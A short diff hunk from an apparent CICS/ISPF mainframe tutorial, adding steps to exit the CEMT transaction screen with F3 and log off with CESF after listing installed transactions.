@@ -9636,7 +9662,9 @@ As always, If you get stuck refer to ''ISPF Naviation'' for help
 * ''Find current os version `Oslevel` and cics level `Cicstslevel`''
 * At the top of the screen overwrite `SYSTEM` with `TRANSACTION` and hit enter
 * Scroll up and down with the `F7` and `F8` to see all the various transactions installed on the system
-</pre>
+* To exit CEMT hit `F3`
+* To log off clear the screen and type `CESF`
+* You can now close the window</pre>
 </div>
 
 </div>
